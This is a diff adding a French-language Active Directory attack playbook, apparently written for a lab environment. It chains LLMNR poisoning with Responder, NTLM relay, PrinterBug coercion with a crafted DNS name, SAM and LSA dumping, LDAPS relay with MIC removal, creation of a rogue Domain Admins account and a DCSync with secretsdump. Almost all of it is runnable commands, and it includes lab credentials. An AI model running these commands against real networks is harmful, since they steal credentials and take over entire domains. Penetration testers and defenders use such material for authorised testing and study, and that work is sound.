@@ -1,0 +1,78 @@
+Si les protocoles LLMNR,NBT-NS et MDNS sont activés :
+
+1. Lancer Responder pour empoisonner les requêtes
+
+```bash
+sudo responder -I eth0
+```
+
+2. Lancer ntlmrelayx
+
+```bash
+ntlmrelayx.py -tf smb_hosts -smb2support -socks
+```
+
+3. Lancer la coercition vers "localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
+
+```bash
+nxc smb 192.168.19.23 -d north -u sql_svc -p YouWillNotKerboroast1ngMeeeeee -M coerce_plus -o M=printerbug L=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
+```
+
+Si une machine est vulnérable alors on doit obtenir un proxy socks sur le port 1080 pour le username "/" et le flag AdminStatus "True"
+
+On peut ensuite dump la SAM et LSA avec nxc et proxychains
+
+```bash
+proxychains nxc smb 192.168.19.23 -d '' -u '' -p '' --sam
+proxychains nxc smb 192.168.19.23 -d '' -u '' -p '' --lsa
+```
+
+
+
+Si les protocoles LLMNR,NBT-NS et MDNS ne sont pas activés, créer un enregistrement dns (nécessite un compte)
+
+```bash
+dnstool.py -u 'ASGARD.LOCAL\loki' -p loki <dns_ip> -a add -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d <ip_attacker>
+```
+
+puis refaire la coercition en spécifiant l'ip du serveur dns
+
+```bash
+nxc smb smb_hosts -d north -u sql_svc -p YouWillNotKerboroast1ngMeeeeee -M coerce_plus -o M=printerbug L=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA --dns-server <dns_ip>
+```
+
+
+
+Si un DC est vulnérable, alors on peut relayer vers ldap et passer admin du domaine (nécessite la version impacket de decoder-it -> https://github.com/decoder-it/impacket-partial-mic)
+
+```bash
+ntlmrelayx.py --remove-mic-partial -t ldaps://192.168.19.23 -smb2support -i -l loot
+```
+
+```bash
+nc 127.0.0.1 11000
+```
+
+Dump les objets du domaine dans le dossier de loot
+
+```bash
+dump
+```
+
+Ajouter un user
+
+```bash
+add_user cyblex_adm
+```
+
+L'ajouter au groupe "Domain Admins"
+
+```bash
+add_user_to_group cyblex_adm "Domain Admins"
+```
+
+Faire un dcsync
+
+```bash
+secretsdump.py 'cyblex_adm':'password'@'dc_ip' 
+```
